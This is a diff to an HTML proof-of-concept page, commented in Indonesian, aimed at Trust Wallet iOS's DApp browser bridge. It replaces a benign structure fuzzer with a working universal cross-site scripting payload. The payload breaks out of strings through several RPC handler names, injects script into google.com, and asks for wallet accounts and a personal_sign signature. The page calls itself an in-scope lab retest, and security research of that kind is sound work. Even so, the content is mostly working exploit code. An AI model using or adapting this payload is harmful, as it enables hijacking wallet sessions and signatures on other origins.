@@ -2,128 +2,91 @@
 <html lang="id">
 <head>
   <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Trust Wallet bridge v4 — modifikasi struktur/tipe (jinak)</title>
-  <style>
-    body { font-family: -apple-system, system-ui, sans-serif; margin: 16px; line-height: 1.45; }
-    h1 { font-size: 18px; } h2 { font-size: 15px; margin-top: 18px; }
-    button { font-size: 15px; padding: 10px 14px; margin: 5px 5px 5px 0; }
-    #log { white-space: pre-wrap; background: #111; color: #0f0; padding: 12px;
-           border-radius: 8px; font-family: ui-monospace, Menlo, monospace; font-size: 12px; }
-    .note { color: #555; font-size: 13px; }
-    .box { border: 1px solid #ddd; border-radius: 8px; padding: 12px; margin: 10px 0; }
-  </style>
+  <title>Trust Wallet iOS RPC error UXSS lab</title>
 </head>
 <body>
-  <h1>Bridge v4 — modifikasi struktur &amp; tipe pesan</h1>
-  <p class="note">
-    Retest fix-validation, perangkat/akun sendiri, dalam scope. Sumbu BARU: bukan
-    pemutusan-string (itu sudah mati), tapi <b>tipe & struktur</b> pesan bridge.
-    Payload jinak: <code>alert(document.domain)</code> (same-origin) & marker
-    <code>&lt;h1&gt;</code> (lintas-origin). Tanpa provider/sign/transfer.
-    Diam = tertutup; ada alert/banner = jalur itu perlu dilihat lebih lanjut.
-  </p>
-
-  <div class="box">
-    <h2>A. Control positif (dulu)</h2>
-    <button id="ctlAlert">Tes alert()</button>
-    <button id="ctlDom">Tes penanda DOM</button>
-  </div>
-
-  <div class="box">
-    <h2>B. Fuzz struktur/tipe (same-origin, bukti alert)</h2>
-    <button id="runFuzz">Jalankan</button>
-  </div>
-
-  <div class="box">
-    <h2>C. Satu varian → navigasi ke google.com (bukti marker DOM)</h2>
-    <select id="pick"></select>
-    <button id="runXo">Jalankan &amp; navigasi</button>
-    <span class="note">Cari banner hijau "TW-UXSS-LAB" di paling atas google.</span>
-  </div>
-
-  <pre id="log">Menunggu…</pre>
+  <a id="run" href="https://google.com/">RUN</a>
+  <pre id="status">PoC lab</pre>
 
   <script>
     'use strict';
-    const log = document.querySelector('#log');
-    const lines = [];
-    const put = s => { lines.push(s); log.textContent = lines.join('\n'); };
-    const sleep = ms => new Promise(r => setTimeout(r, ms));
 
-    document.querySelector('#ctlAlert').onclick = () => { alert(document.domain);
-      put('Control alert dipanggil.'); };
-    document.querySelector('#ctlDom').onclick = () => {
-      document.body.insertAdjacentHTML('afterbegin',
-        '<h1 style="background:#0f0;color:#000;margin:0">CONTROL DOM OK — '+document.domain+'</h1>');
-      put('Control DOM disisipkan.'); };
+    const runLink = document.querySelector('#run');
+    const status = document.querySelector('#status');
+    const target = 'https://google.com/';
+    const dummyMessage =
+      'Trust Wallet UXSS lab test only. No authorization or asset transfer.';
+    const dummyMessageHex = '0x' + Array.from(
+      new TextEncoder().encode(dummyMessage),
+      byte => byte.toString(16).padStart(2, '0')
+    ).join('');
 
-    const P_ALERT = 'zz_");alert(document.domain)//';
-    const P_MARK  = 'zz_");(function(){if(!/(^|\\.)google\\.com$/.test(location.hostname))return;'
-                  + 'if(window.__twLab)return;window.__twLab=1;'
-                  + "document.body&&document.body.insertAdjacentHTML('afterbegin',"
-                  + "'<h1 id=tw-uxss-lab style=\"background:#0f0;color:#000;margin:0\">"
-                  + "TW-UXSS-LAB: '+document.domain+'</h1>');})()//";
+    const impactStatements = [
+      '(async () => {',
+      String.raw`if (!/(^|\.)google\.com$/.test(location.hostname)) return;`,
+      'if (window.__twUxssLab) return;',
+      'const provider = window.ethereum;',
+      "if (!provider || typeof provider.request !== 'function') return;",
+      'window.__twUxssLab = true;',
+      "document.body?.insertAdjacentHTML('afterbegin', '<h1 id=tw-uxss-lab>PWNED BY BADCAT</h1>');alert(document.domain);",
+      'let accounts;',
+      "try { accounts = await provider.request({method: 'eth_requestAccounts'}); }",
+      "catch (error) { console.log('UXSS lab: connect ditolak', String(error)); return; }",
+      'if (!accounts?.[0]) return;',
+      `try { await provider.request({method: 'personal_sign', params: [${JSON.stringify(dummyMessageHex)}, accounts[0]]}); }`,
+      "catch (error) { console.log('UXSS lab: sign dummy ditolak', String(error)); }",
+      '})();'
+    ];
 
-    // Sumbu BARU: variasi struktur & tipe. Payload string diselipkan di titik-titik
-    // tak biasa; sebagian besar menguji type-confusion/prototype, bukan breakout string.
-    function variants(P, baseId) {
-      return [
-        { d: 'name zero-width',   msg: { id: baseId, network:'ethereum', name:'rpc​Call',
-              object:{ method:P, params:[], jsonrpc:'2.0' } } },
-        { d: 'name uppercase',    msg: { id: baseId, network:'ethereum', name:'RPCCALL',
-              object:{ method:P, params:[], jsonrpc:'2.0' } } },
-        { d: 'name spasi',        msg: { id: baseId, network:'ethereum', name:' rpcCall ',
-              object:{ method:P, params:[], jsonrpc:'2.0' } } },
-        { d: 'object=array',      msg: { id: baseId, network:'ethereum', name:'rpcCall',
-              object:[ P ] } },
-        { d: 'proto key',         msg: { id: baseId, network:'ethereum', name:'rpcCall',
-              object:{ method:'eth_chainId', params:[], jsonrpc:'2.0', __proto__:{ polluted:P } } } },
-        { d: 'constructor key',   msg: { id: baseId, network:'ethereum', name:'rpcCall',
-              object:{ method:'eth_chainId', params:[], jsonrpc:'2.0', constructor:P } } },
-        { d: 'method angka+params obj', msg: { id: baseId, network:'ethereum', name:'rpcCall',
-              object:{ method:1, params:{ data:P }, jsonrpc:'2.0' } } },
-        { d: 'id sebagai object', msg: { id: { toString:()=>P }, network:'ethereum', name:'rpcCall',
-              object:{ method:'eth_chainId', params:[], jsonrpc:'2.0' } } },
-        { d: 'nested dalam',      msg: { id: baseId, network:'ethereum', name:'rpcCall',
-              object:{ method:'eth_chainId', params:[{ a:{ b:{ c:P } } }], jsonrpc:'2.0' } } },
-        { d: 'extra top field',   msg: { id: baseId, network:'ethereum', name:'rpcCall', extra:P,
-              object:{ method:'eth_chainId', params:[], jsonrpc:'2.0' } } }
-      ];
-    }
+    // --- MODIFIKASI MINIMAL: beberapa penutup + beberapa handler, sisanya tetap ---
+    const payload = impactStatements.join(' ');
+    const closers = ['");', "');", '`);', '\\";', '\\u0022);'];
+    const handlers = ['rpcCall', 'signMessage', 'signPersonalMessage',
+                      'signTransaction', 'requestAccounts'];
+    const markers = closers.map(c => `zz_${c}${payload}//`);
+    // ----------------------------------------------------------------------------
 
-    // isi dropdown C
-    const names = variants(P_MARK, 0).map(v => v.d);
-    const sel = document.querySelector('#pick');
-    names.forEach((n,i)=>{ const o=document.createElement('option'); o.value=i; o.textContent=n; sel.appendChild(o); });
+    runLink.addEventListener('click', event => {
+      event.preventDefault();
 
-    document.querySelector('#runFuzz').onclick = async () => {
       const bridge = window.webkit?.messageHandlers?._tw_;
-      if (!bridge?.postMessage || !window.trustwallet?.ethereum) {
-        put('Buka di DApp browser Trust Wallet iOS.'); return; }
-      lines.length = 0;
-      put('Fuzz struktur/tipe (same-origin). Amati alert. Diam total = tertutup.\n');
-      const vs = variants(P_ALERT, Math.trunc(Date.now()%9e15));
-      for (const v of vs) {
-        put(`— ${v.d}`);
-        try { bridge.postMessage(v.msg); } catch (e) { put(`    tolak: ${String(e)}`); }
-        await sleep(120);
+      if (!bridge || typeof bridge.postMessage !== 'function' ||
+          !window.trustwallet?.ethereum) {
+        status.textContent =
+          'Buka halaman ini pada DApp browser Trust Wallet iOS 26.38.10.';
+        return;
       }
-      put('\nSelesai. Tidak ada alert = seluruh varian struktur/tipe ini tertutup.');
-    };
 
-    document.querySelector('#runXo').onclick = () => {
-      const bridge = window.webkit?.messageHandlers?._tw_;
-      if (!bridge?.postMessage || !window.trustwallet?.ethereum) {
-        put('Buka di DApp browser Trust Wallet iOS.'); return; }
-      const i = Number(sel.value);
-      const v = variants(P_MARK, Math.trunc(Date.now()%9e15))[i];
-      lines.length = 0;
-      put(`Lintas-origin: ${v.d}`);
-      try { bridge.postMessage(v.msg); } catch (e) { put(`tolak: ${String(e)}`); }
-      put('Navigasi ke google.com… cari banner "TW-UXSS-LAB".');
-      setTimeout(() => location.assign('https://google.com/'), 120);
-    };
+      const baseId = Math.trunc(Date.now() % 9000000000000000);
+      let sent = 0;
+
+      // MODIFIKASI: loop atas (handler x marker) menggantikan 8x rpcCall/method saja.
+      let i = 0;
+      for (const name of handlers) {
+        for (const marker of markers) {
+          try {
+            bridge.postMessage({
+              id: baseId + i,
+              network: 'ethereum',
+              name: name,
+              object: {
+                method: marker,
+                params: [marker],   // sisipkan juga di params (sisa struktur tetap)
+                jsonrpc: '2.0'
+              }
+            });
+            sent++;
+          } catch (error) {
+            status.textContent =
+              `Bridge menolak request ke-${i + 1}: ${String(error)}`;
+          }
+          i++;
+        }
+      }
+
+      status.textContent = `${sent} request RPC dikirim; navigasi ke ${target}`;
+      setTimeout(() => location.assign(target), 120);
+    }, {once: true});
   </script>
 </body>
 </html>
